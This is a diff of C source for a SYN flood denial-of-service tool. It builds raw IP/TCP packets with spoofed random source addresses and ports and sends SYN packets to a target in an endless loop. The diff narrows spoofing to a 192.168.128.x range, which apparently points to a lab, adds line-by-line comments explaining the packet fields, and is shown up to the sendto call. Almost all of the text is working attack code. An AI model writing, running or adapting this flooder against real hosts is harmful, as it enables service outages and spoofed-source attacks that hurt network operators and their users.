@@ -5,7 +5,6 @@
  * Sends crafted TCP SYN packets with randomized source IP/port
  * to exhaust the target's half-open connection table.
  *
- * Must be run as root (raw sockets).
  */
 
 #define _GNU_SOURCE   /* usleep, useconds_t */
@@ -20,6 +19,9 @@
 #include <netinet/ip.h>
 #include <sys/socket.h>
 
+#define TH_SYN 0x02
+#define TCP_HDR_LEN 20
+
 /* --- Portable TCP header (avoids glibc bitfield-ordering issues) --- */
 struct tcp_hdr {
     uint16_t th_sport;
@@ -33,8 +35,6 @@ struct tcp_hdr {
     uint16_t th_urp;
 };
 
-#define TH_SYN 0x02
-#define TCP_HDR_LEN 20
 
 /* Pseudo-header for TCP checksum calculation */
 struct pseudo_header {
@@ -69,12 +69,22 @@ static uint16_t checksum(const void *buf, size_t len)
 }
 
 /* Generate a random IP that avoids 0.x.x.x and 127.x.x.x */
-static uint32_t rand_ip(void)
+// static uint32_t rand_ip(void)
+// {
+//     // 4 bytes for IPv4
+//     uint32_t ip;
+//     do {
+//         ip = (uint32_t)rand();
+//     } while ((ip & 0xFF) == 0 || (ip & 0xFF) == 127);
+//     return ip;
+// }
+
+static uint32_t rand_ip_local(void)
 {
+    uint8_t last = (uint8_t)(2 + (rand() % 253));
+    uint8_t bytes[4] = {192, 168, 128, last};
     uint32_t ip;
-    do {
-        ip = (uint32_t)rand();
-    } while ((ip & 0xFF) == 0 || (ip & 0xFF) == 127);
+    memcpy(&ip, bytes, 4);
     return ip;
 }
 
@@ -123,6 +133,7 @@ int main(int argc, char *argv[])
         return EXIT_FAILURE;
     }
 
+    // ensure random for two instances launched in the same second
     srand((unsigned)time(NULL) ^ (unsigned)getpid());
 
     /*
@@ -132,8 +143,8 @@ int main(int argc, char *argv[])
     char packet[sizeof(struct iphdr) + TCP_HDR_LEN];
     memset(packet, 0, sizeof(packet));
 
-    struct iphdr   *iph  = (struct iphdr *)packet;
-    struct tcp_hdr *tcph = (struct tcp_hdr *)(packet + sizeof(struct iphdr));
+    struct iphdr   *iph  = (struct iphdr *)packet; // pointer on the beggining of the packet
+    struct tcp_hdr *tcph = (struct tcp_hdr *)(packet + sizeof(struct iphdr)); // pointer on the TCP
 
     /* Destination address for sendto() */
     struct sockaddr_in dest;
@@ -152,48 +163,51 @@ int main(int argc, char *argv[])
 
     while (1) {
         /* Randomize source IP and source port each iteration */
-        uint32_t src_ip   = rand_ip();
-        uint16_t src_port = (uint16_t)(1024 + (rand() % (65535 - 1024)));
+        uint32_t src_ip   = rand_ip_local(); // get random IP in 4 bytes
+        uint16_t src_port = (uint16_t)(1024 + (rand() % (65535 - 1024))); // get random port from range 1024 - 65535
 
-        /* ---- IP header ---- */
-        iph->ihl      = 5;
+        /* IP header */
+        iph->ihl      = 5; // 5 4-byte words
         iph->version   = 4;
-        iph->tos       = 0;
-        iph->tot_len   = htons((uint16_t)sizeof(packet));
-        iph->id        = htons((uint16_t)(rand() & 0xFFFF));
+        iph->tos       = 0; // normal service
+        iph->tot_len   = htons((uint16_t)sizeof(packet)); // use big endian - left to right
+        iph->id        = htons((uint16_t)(rand() & 0xFFFF)); // keep only the last 16 bits
         iph->frag_off  = 0;
-        iph->ttl       = 64;
-        iph->protocol  = IPPROTO_TCP;
-        iph->check     = 0;
-        iph->saddr     = src_ip;
-        iph->daddr     = target_addr.s_addr;
+        iph->ttl       = 64; 
+        iph->protocol  = IPPROTO_TCP; // next layer protocol 
+        iph->check     = 0; // checksum uses its own field
+        iph->saddr     = src_ip; // set the random
+        iph->daddr     = target_addr.s_addr; // set 
 
         iph->check = checksum(iph, sizeof(struct iphdr));
 
-        /* ---- TCP header ---- */
-        tcph->th_sport  = htons(src_port);
-        tcph->th_dport  = htons(target_port);
-        tcph->th_seq    = htonl((uint32_t)rand());
-        tcph->th_ack    = 0;
-        tcph->th_offx2  = (5 << 4);     /* data offset = 5 (20 bytes) */
-        tcph->th_flags  = TH_SYN;
-        tcph->th_win    = htons(65535);
-        tcph->th_sum    = 0;
-        tcph->th_urp    = 0;
+        /* TCP real header */
+        tcph->th_sport  = htons(src_port);    // source port
+        tcph->th_dport  = htons(target_port); // destination port (80)
+        tcph->th_seq    = htonl(rand());      // random sequence number
+        tcph->th_ack    = 0;                  // no acknowledgment
+        tcph->th_offx2  = (5 << 4);          // header is 20 bytes
+        tcph->th_flags  = TH_SYN;            // SYN flag set
+        tcph->th_win    = htons(65535);       // window size
+        tcph->th_sum    = 0;                  // checksum (computed later)
+        tcph->th_urp    = 0;                  // no urgent data
+
 
         /* TCP checksum with pseudo-header */
-        char csum_buf[sizeof(struct pseudo_header) + TCP_HDR_LEN];
-        memset(csum_buf, 0, sizeof(csum_buf));
+        char csum_buf[sizeof(struct pseudo_header) + TCP_HDR_LEN]; // need also the pseudo header because TCP computes checksum form src and dst IPs
+        memset(csum_buf, 0, sizeof(csum_buf)); // set all to 0
 
         struct pseudo_header *psh = (struct pseudo_header *)csum_buf;
+        // set data 
         psh->src_addr    = src_ip;
         psh->dst_addr    = target_addr.s_addr;
         psh->placeholder = 0;
         psh->protocol    = IPPROTO_TCP;
         psh->tcp_length  = htons(TCP_HDR_LEN);
 
+        // copy the tcp header into buf from the tcp start position
         memcpy(csum_buf + sizeof(struct pseudo_header), tcph, TCP_HDR_LEN);
-        tcph->th_sum = checksum(csum_buf, sizeof(csum_buf));
+        tcph->th_sum = checksum(csum_buf, sizeof(csum_buf)); // copmute checksum for the helper buffer and set to tcp header
 
         /* Send */
         ssize_t sent = sendto(sockfd, packet, sizeof(packet), 0,
